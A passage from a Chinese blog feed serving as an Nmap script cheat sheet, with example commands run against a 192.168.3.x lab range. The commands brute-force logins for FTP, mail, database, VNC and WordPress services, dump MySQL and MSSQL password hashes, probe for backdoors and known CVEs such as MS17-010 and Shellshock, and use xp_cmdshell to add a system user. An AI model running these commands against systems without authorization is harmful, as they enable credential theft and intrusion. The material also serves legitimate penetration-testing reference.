class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 21 --script ftp-brute.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>ftp-vuln-cve2010-4221.nse    ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>ftp-proftpd-backdoor.nse    ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>ftp-vsftpd-backdoor.nse    VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><h4 id="和ssh相关的扫描脚本22"><a href="#和ssh相关的扫描脚本22" class="headerlink" title="和ssh相关的扫描脚本22"></a>和ssh相关的扫描脚本22</h4><p>sshv1.nse     sshv1是可以中间人的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 22 --script sshv1.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><h4 id="和smtp相关的脚本25"><a href="#和smtp相关的脚本25" class="headerlink" title="和smtp相关的脚本25"></a>和smtp相关的脚本25</h4><p>smtp-brute.nse    简单爆破smtp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 25 --script smtp-brute.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>smtp-enum-users.nse      枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>smtp-vuln-cve2010-4344.nse    Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>smtp-vuln-cve2011-1720.nse     Postfix 2.5.13之<br>前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>smtp-vuln-cve2011-1764.nse     Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><h4 id="和pop3相关的扫描脚本110-995"><a href="#和pop3相关的扫描脚本110-995" class="headerlink" title="和pop3相关的扫描脚本110,995"></a>和pop3相关的扫描脚本110,995</h4><p>pop3-brute.nse    pop简单弱口令爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 110 --script pop3-brute.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><h4 id="和imap相关的一些扫描脚本143-993"><a href="#和imap相关的一些扫描脚本143-993" class="headerlink" title="和imap相关的一些扫描脚本143,993"></a>和imap相关的一些扫描脚本143,993</h4><p>imap-brute.nse    imap简单弱口令爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><h4 id="和dns相关的扫描脚本53"><a href="#和dns相关的扫描脚本53" class="headerlink" title="和dns相关的扫描脚本53"></a>和dns相关的扫描脚本53</h4><p>dns-zone-transfer.nse     检查目标ns服务器是否允许传送</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23</span><br><span class="line"># nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain&#x3D;target.org -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>hostmap-ip2hosts.nse     旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23</span><br></pre></td></tr></table></figure><h5 id="和数据库相关的扫描脚本"><a href="#和数据库相关的扫描脚本" class="headerlink" title="和数据库相关的扫描脚本"></a>和数据库相关的扫描脚本</h5><p>informix-brute.nse   informix爆破脚本9088</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 9088 --script informix-brute.nse 192.168.3.23</span><br></pre></td></tr></table></figure><p>mysql-empty-password.nse   mysql 扫描root空密码3306</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>mysql-brute.nse    mysql root弱口令简单爆破3306</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>mysql-dump-hashes.nse    导出mysql中所有用户的hash3306</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 3306 --script mysql-dump-hashes --script-args&#x3D;&#39;username&#x3D;root,password&#x3D;root&#39; 192.168.3.23</span><br></pre></td></tr></table></figure><p>mysql-vuln-cve2012-2122.nse   Mysql身份认证漏洞[MariaDB and MySQL   5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻  [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]3306</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v 192.168.3.23</span><br></pre></td></tr></table></figure><p>ms-sql-info.nse 扫描C段mssql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port&#x3D;1433 -v 192.168.3.0&#x2F;24</span><br><span class="line"># nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port&#x3D;1433 -v 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>ms-sql-empty-password.nse     扫描mssql sa空密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>ms-sql-xp-cmdshell.nse   利用xp_cmdshell,远程执行系统命令1433</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username&#x3D;sa,mssql.password&#x3D;sa,ms-sql-xp-cmdshell.cmd&#x3D;&quot;net user test test &#x2F;add&quot; 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>ms-sql-dump-hashes.nse    导出mssql中所有的数据库用户及密码hash1433</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>pgsql-brute.nse   尝试爆破postgresql5432</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 5432 --script pgsql-brute -v 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>oracle-brute-stealth.nse  尝试爆破oracle1521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid&#x3D;ORCL  -v 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>mongodb-brute.nse   尝试爆破mongdb27017</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 27017  --script mongodb-brute 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>redis-brute.nse   redis爆破6379</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 6379 --script redis-brute.nse 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>oracle-brute.nse oracle爆破1521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid&#x3D;ORCL -v 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="和snmp相关的脚本"><a href="#和snmp相关的脚本" class="headerlink" title="和snmp相关的脚本"></a>和snmp相关的脚本</h4><p>snmp-brute.nse   爆破C段的snmp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb&#x3D;user.txt 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="和ldap服务相关的一些利用脚本"><a href="#和ldap服务相关的一些利用脚本" class="headerlink" title="和ldap服务相关的一些利用脚本"></a>和ldap服务相关的一些利用脚本</h4><p>ldap-brute.nse   简单爆破ldap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 389 --script ldap-brute --script-args ldap.base&#x3D;&#39;&quot;cn&#x3D;users,dc&#x3D;cqure,dc&#x3D;net&quot;&#39; 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="和各类web中间件-web集成环境相关的一些利用脚本"><a href="#和各类web中间件-web集成环境相关的一些利用脚本" class="headerlink" title="和各类web中间件,web集成环境相关的一些利用脚本"></a>和各类web中间件,web集成环境相关的一些利用脚本</h4><p>xmpp-brute.nse    xmpp爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 5222 --script xmpp-brute.nse  192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-iis-short-name-brute.nse       短文件扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-iis-webdav-vuln.nse       iis 5.0 /6.0 webadv写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-shellshock.nse      bash远程执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -sV -p- --script http-shellshock --script-args uri&#x3D;&#x2F;cgi-bin&#x2F;bin,cmd&#x3D;ls 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-svn-info.nse       探测目标svn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script http-svn-info 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-drupal-enum.nse        其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来<br>http-wordpress-brute.nse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p80 -sV --script http-wordpress-brute --script-args &#39;userdb&#x3D;users.txt,passdb&#x3D;passwds.txt,http-wordpress-brute.hostname&#x3D;domain.com,http-wordpress-brute.threads&#x3D;3,brute.firstonly&#x3D;true&#39; 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-backup-finder.nse   扫描目标网站备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p80 --script&#x3D;http-backup-finder 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>http-vuln-cve2015-1635.nse   iis6.0远程代码执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -sV --script http-vuln-cve* --script-args uri&#x3D;&#39;&#x2F;anotheruri&#x2F;&#39;  192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="跟vpn相关的一些脚本"><a href="#跟vpn相关的一些脚本" class="headerlink" title="跟vpn相关的一些脚本"></a>跟vpn相关的一些脚本</h4><p>pptp-version.nse   识别目标pptp版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 1723 --script pptp-version.nse 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="smb漏洞检测脚本集"><a href="#smb漏洞检测脚本集" class="headerlink" title="smb漏洞检测脚本集"></a>smb漏洞检测脚本集</h4><p>smb-vuln-ms08-067.nse<br>smb-vuln-ms10-054.nse<br>smb-vuln-ms10-061.nse<br>smb-vuln-ms17-010.nse       smb远程执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="检测内网嗅探"><a href="#检测内网嗅探" class="headerlink" title="检测内网嗅探"></a>检测内网嗅探</h4><p>sniffer-detect.nse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="其它的一些辅助性脚本"><a href="#其它的一些辅助性脚本" class="headerlink" title="其它的一些辅助性脚本"></a>其它的一些辅助性脚本</h4><p>rsync-brute.nse     爆破目标的rsync</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 873 --script rsync-brute --script-args &#39;rsync-brute.module&#x3D;www&#39; 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>rlogin-brute.nse     爆破目标的rlogin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 513 --script rlogin-brute 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>vnc-brute.nse       爆破目标的vnc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script vnc-brute -p 5900 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>pcanywhere-brute.nse     爆破pcanywhere</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap -p 5631 --script&#x3D;pcanywhere-brute 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>nessus-brute.nse     爆破nessus,貌似现在已经不是1241端口了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script nessus-brute -p 1241 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>nexpose-brute.nse     爆破nexpose</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script nexpose-brute -p 3780 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure><p>shodan-api.nse      配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># nmap --script shodan-api --script-args &#39;shodan-api.target&#x3D;192.168.3.0&#x2F;24,shodan-api.apikey&#x3D;SHODANAPIKEY&#39;</span><br></pre></td></tr></table></figure><h4 id="尝试利用nmap一句话进行目标C段常规漏洞扫描"><a href="#尝试利用nmap一句话进行目标C段常规漏洞扫描" class="headerlink" title="尝试利用nmap一句话进行目标C段常规漏洞扫描"></a>尝试利用nmap一句话进行目标C段常规漏洞扫描</h4><p>nmap -sT -Pn -v –script  dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24</p><h4 id="nmap一句话进行目标C段弱口令爆破"><a href="#nmap一句话进行目标C段弱口令爆破" class="headerlink" title="nmap一句话进行目标C段弱口令爆破"></a>nmap一句话进行目标C段弱口令爆破</h4><p>nmap -sT -v -Pn –script  ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Nmap受到攻击者和管理员的欢迎，因为它非常有效且可靠。它是网络诊断和网络系统评估的重要组成部分。除此之外，漏洞扫描程序 Nessus还使用它来检测开放端口。&lt;/p&gt;
&lt;h3 id=&quot;参数&quot;&gt;&lt;a href=&quot;#参数&quot; class=&quot;headerlink&quot; title=&quot;参
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="网络工具" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
